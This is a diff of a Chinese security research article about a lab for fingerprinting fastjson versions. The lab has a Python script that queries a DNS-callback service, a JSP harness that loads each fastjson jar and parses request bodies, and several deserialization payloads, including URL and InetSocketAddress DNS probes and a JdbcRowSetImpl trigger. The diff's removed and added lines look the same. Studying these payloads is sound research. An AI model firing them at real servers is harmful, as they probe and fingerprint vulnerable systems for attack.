@@ -32,7 +32,7 @@ source: "MrWQ/vulnerability-paper"
 用 pom 把所有版本的 fastjson 下载了，然后在 fastjson 文件夹下执行这个命令，把 fastjson 固定在一个文件内，通过反射装载 jar，调用完以后卸载
 
 ```
-find . -name "*.jar" -type f -exec cp  {} /Users/f0ng/xxxxxx/ \;
+find . -name "*.jar" -type f -exec cp  {} /Users/f0ng/xxxxxx/ \;
 
 
 ```
@@ -131,135 +131,135 @@ find . -name "*.jar" -type f -exec cp  {} /Users/f0ng/xxxxxx/ \;
 python 脚本如下
 
 ```
-# -*- coding: utf-8 -*-  
-# @Software: f0ng  
-  
-fastjosn_version = ["1_2_83",  
-"1_2_80",  
-"1_2_79",  
-"1_2_78",  
-"1_2_77",  
-"1_2_76",  
-"1_2_75",  
-"1_2_74",  
-"1_2_73",  
-"1_2_72",  
-"1_2_71",  
-"1_2_70",  
-"1_2_69",  
-"1_2_68",  
-"1_2_67",  
-"1_2_66",  
-"1_2_62",  
-"1_2_61",  
-"1_2_60",  
-"1_2_59",  
-"1_2_58",  
-"1_2_57",  
-"1_2_56",  
-"1_2_55",  
-"1_2_54",  
-"1_2_53",  
-"1_2_52",  
-"1_2_51",  
-"1_2_50",  
-"1_2_49",  
-"1_2_48",  
-"1_2_47",  
-"1_2_46",  
-"1_2_45",  
-"1_2_44",  
-"1_2_43",  
-"1_2_42",  
-"1_2_41",  
-"1_2_40",  
-"1_2_39",  
-"1_2_38",  
-"1_2_37",  
-"1_2_36",  
-"1_2_35",  
-"1_2_34",  
-"1_2_33",  
-"1_2_32",  
-"1_2_31",  
-"1_2_30",  
-"1_2_29",  
-"1_2_28",  
-"1_2_27",  
-"1_2_26",  
-"1_2_25",  
-"1_2_24",  
-"1_2_23",  
-"1_2_22",  
-"1_2_21",  
-"1_2_20",  
-"1_2_19",  
-"1_2_18",  
-"1_2_17",  
-"1_2_16",  
-"1_2_15",  
-"1_2_14",  
-"1_2_13",  
-"1_2_12",  
-"1_2_11",  
-"1_2_10",  
-"1_2_9",  
-"1_2_8",  
-"1_2_7",  
-"1_2_6",  
-"1_2_5",  
-"1_2_4",  
-"1_2_3",  
-"1_2_2",  
-"1_2_1"]  
-  
-import requests  
-  
-def convert_to_ranges(versions):  
-    ranges = []  
-    start = end = versions[0]  
-  
-    for v in versions[1:] + [None]:  
-        # 将版本号字符串转换为数字列表  
-        parts = list(map(int, v.split('_'))) if v is not None else None  
-        end_parts = list(map(int, end.split('_')))  
-  
-        # 检查版本是否连续  
-        if parts is not None and parts[0] == end_parts[0] \  
-           and parts[1] == end_parts[1] and parts[2] == end_parts[2] - 1:  
-            end = v  
-        else:  
-            # 如果只有一个版本，只添加这个版本  
-            if start == end:  
-                ranges.append(start)  
-            else:  
-                ranges.append(f"{end}-{start}")  
-            if v is not None:  
-                start = end = v  
-    return ranges  
-  
-  
-  
-burp0_url = "https://callback.red:443/"  
-burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Sec-Ch-Ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"", "Sec-Ch-Ua-Platform": "\"macOS\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*", "Origin": "https://www.callback.red", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.callback.red/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}  
-  
-burp0_data = {"key":  
-                  "xxxxxxxxx"}  
-resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)  
-  
-  
-total = []  
-for _ in fastjosn_version:  
-    if  _.replace(".","_")+"." not in resp.text :  
-        total.append(_)  
-  
-  
-if len(total) > 0:  
-    # 调用函数并打印结果  
-    version_ranges = convert_to_ranges(total)  
-else:  
-    version_ranges = "无"  
-print("不可用版本")  
+# -*- coding: utf-8 -*-  
+# @Software: f0ng  
+  
+fastjosn_version = ["1_2_83",  
+"1_2_80",  
+"1_2_79",  
+"1_2_78",  
+"1_2_77",  
+"1_2_76",  
+"1_2_75",  
+"1_2_74",  
+"1_2_73",  
+"1_2_72",  
+"1_2_71",  
+"1_2_70",  
+"1_2_69",  
+"1_2_68",  
+"1_2_67",  
+"1_2_66",  
+"1_2_62",  
+"1_2_61",  
+"1_2_60",  
+"1_2_59",  
+"1_2_58",  
+"1_2_57",  
+"1_2_56",  
+"1_2_55",  
+"1_2_54",  
+"1_2_53",  
+"1_2_52",  
+"1_2_51",  
+"1_2_50",  
+"1_2_49",  
+"1_2_48",  
+"1_2_47",  
+"1_2_46",  
+"1_2_45",  
+"1_2_44",  
+"1_2_43",  
+"1_2_42",  
+"1_2_41",  
+"1_2_40",  
+"1_2_39",  
+"1_2_38",  
+"1_2_37",  
+"1_2_36",  
+"1_2_35",  
+"1_2_34",  
+"1_2_33",  
+"1_2_32",  
+"1_2_31",  
+"1_2_30",  
+"1_2_29",  
+"1_2_28",  
+"1_2_27",  
+"1_2_26",  
+"1_2_25",  
+"1_2_24",  
+"1_2_23",  
+"1_2_22",  
+"1_2_21",  
+"1_2_20",  
+"1_2_19",  
+"1_2_18",  
+"1_2_17",  
+"1_2_16",  
+"1_2_15",  
+"1_2_14",  
+"1_2_13",  
+"1_2_12",  
+"1_2_11",  
+"1_2_10",  
+"1_2_9",  
+"1_2_8",  
+"1_2_7",  
+"1_2_6",  
+"1_2_5",  
+"1_2_4",  
+"1_2_3",  
+"1_2_2",  
+"1_2_1"]  
+  
+import requests  
+  
+def convert_to_ranges(versions):  
+    ranges = []  
+    start = end = versions[0]  
+  
+    for v in versions[1:] + [None]:  
+        # 将版本号字符串转换为数字列表  
+        parts = list(map(int, v.split('_'))) if v is not None else None  
+        end_parts = list(map(int, end.split('_')))  
+  
+        # 检查版本是否连续  
+        if parts is not None and parts[0] == end_parts[0] \  
+           and parts[1] == end_parts[1] and parts[2] == end_parts[2] - 1:  
+            end = v  
+        else:  
+            # 如果只有一个版本，只添加这个版本  
+            if start == end:  
+                ranges.append(start)  
+            else:  
+                ranges.append(f"{end}-{start}")  
+            if v is not None:  
+                start = end = v  
+    return ranges  
+  
+  
+  
+burp0_url = "https://callback.red:443/"  
+burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Sec-Ch-Ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"", "Sec-Ch-Ua-Platform": "\"macOS\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded", "Accept": "*/*", "Origin": "https://www.callback.red", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.callback.red/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close"}  
+  
+burp0_data = {"key":  
+                  "xxxxxxxxx"}  
+resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)  
+  
+  
+total = []  
+for _ in fastjosn_version:  
+    if  _.replace(".","_")+"." not in resp.text :  
+        total.append(_)  
+  
+  
+if len(total) > 0:  
+    # 调用函数并打印结果  
+    version_ranges = convert_to_ranges(total)  
+else:  
+    version_ranges = "无"  
+print("不可用版本")  
 print(version_ranges)
 
 
@@ -275,47 +275,47 @@ print(version_ranges)
 jsp 源码如下
 
 ```
-<%@ page import="java.io.InputStreamReader" %>  
-<%@ page import="java.io.BufferedReader" %>  
-<%@ page import="java.lang.reflect.Field" %>  
-<%@ page import="java.net.URL" %>  
-<%@ page import="java.net.URLClassLoader" %>  
-<%@ page import="java.lang.reflect.Method" %>  
-  
-<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
-<%--测试fastjson各个版本payload、bypass字符--%>  
-<%  
-      // JAR文件的路径  
-      URL jarUrl = new URL("file:///Users/f0ng/fastjsonjars/fastjson-"+request.getParameter("version").replace("_",".")+".jar");  
-// 父类加载器，可以用当前线程的类加载器等  
-      ClassLoader parentClassLoader = Thread.currentThread().getContextClassLoader();  
-// 创建URLClassLoader实例以加载JAR  
-      URLClassLoader classLoader = new URLClassLoader(new URL[]{jarUrl}, parentClassLoader);  
-  
-      Class var8 = classLoader.loadClass("com.alibaba.fastjson.JSONArray");  
-      Field var9 = var8.getField("VERSION");  
-      String var10 = (String)var9.get("");  
-  
-  
-      response.setHeader("version",var10);  
-  
-      BufferedReader br = new BufferedReader(new InputStreamReader((ServletInputStream) request.getInputStream(), "utf-8"));  
-  
-      StringBuffer sb = new StringBuffer("");  
-      String temp;  
-  
-      while ((temp = br.readLine()) != null) {  
-            sb.append(temp);  
-      }  
-  
-      br.close();  
-      String params = sb.toString();  
-  
- out.print(params);  
- Class var81 = classLoader.loadClass("com.alibaba.fastjson.JSON");  
- Method parseMethod = var81.getMethod("parse", String.class);  
- Object result = parseMethod.invoke(null, params);  
- classLoader.close();  
+<%@ page import="java.io.InputStreamReader" %>  
+<%@ page import="java.io.BufferedReader" %>  
+<%@ page import="java.lang.reflect.Field" %>  
+<%@ page import="java.net.URL" %>  
+<%@ page import="java.net.URLClassLoader" %>  
+<%@ page import="java.lang.reflect.Method" %>  
+  
+<%@ page contentType="text/html;charset=UTF-8" language="java" %>  
+<%--测试fastjson各个版本payload、bypass字符--%>  
+<%  
+      // JAR文件的路径  
+      URL jarUrl = new URL("file:///Users/f0ng/fastjsonjars/fastjson-"+request.getParameter("version").replace("_",".")+".jar");  
+// 父类加载器，可以用当前线程的类加载器等  
+      ClassLoader parentClassLoader = Thread.currentThread().getContextClassLoader();  
+// 创建URLClassLoader实例以加载JAR  
+      URLClassLoader classLoader = new URLClassLoader(new URL[]{jarUrl}, parentClassLoader);  
+  
+      Class var8 = classLoader.loadClass("com.alibaba.fastjson.JSONArray");  
+      Field var9 = var8.getField("VERSION");  
+      String var10 = (String)var9.get("");  
+  
+  
+      response.setHeader("version",var10);  
+  
+      BufferedReader br = new BufferedReader(new InputStreamReader((ServletInputStream) request.getInputStream(), "utf-8"));  
+  
+      StringBuffer sb = new StringBuffer("");  
+      String temp;  
+  
+      while ((temp = br.readLine()) != null) {  
+            sb.append(temp);  
+      }  
+  
+      br.close();  
+      String params = sb.toString();  
+  
+ out.print(params);  
+ Class var81 = classLoader.loadClass("com.alibaba.fastjson.JSON");  
+ Method parseMethod = var81.getMethod("parse", String.class);  
+ Object result = parseMethod.invoke(null, params);  
+ classLoader.close();  
 %>
 
 
@@ -339,7 +339,7 @@ dnslog 的 payload 流程如上，其他类型，如报错、回显这种也类�
 #### payload 1(dns 请求)【fastjson>=1.2.37】
 
 ```
-{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://§1§.\{\{URL\}\}"\}\}""}
+{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://§1§.\{\{URL\}\}"\}\}""}
 
 
 ```
@@ -439,7 +439,7 @@ Set[{"@type":"java.net.URL","val":"http://§1§.\{\{URL\}\}"}
 #### payload 9(dns 请求)【1.2.9<=fastjson<=1.2.68】
 
 ```
-[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "§1§.\{\{URL\}\}"\}\}]
+[{"@type": "java.lang.AutoCloseable","@type": "java.io.ByteArrayOutputStream"},{"@type": "java.io.ByteArrayOutputStream"},{"@type": "java.net.InetSocketAddress"{"address":,"val": "§1§.\{\{URL\}\}"\}\}]
 
 
 ```
@@ -539,7 +539,7 @@ Set[{"@type":"java.net.URL","val":"http://§1§.\{\{URL\}\}"}
 #### payload 17(报错) 【fastjson<=1.2.47】
 
 ```
-{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"\}\}
+{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"\}\}
 
 
 ```
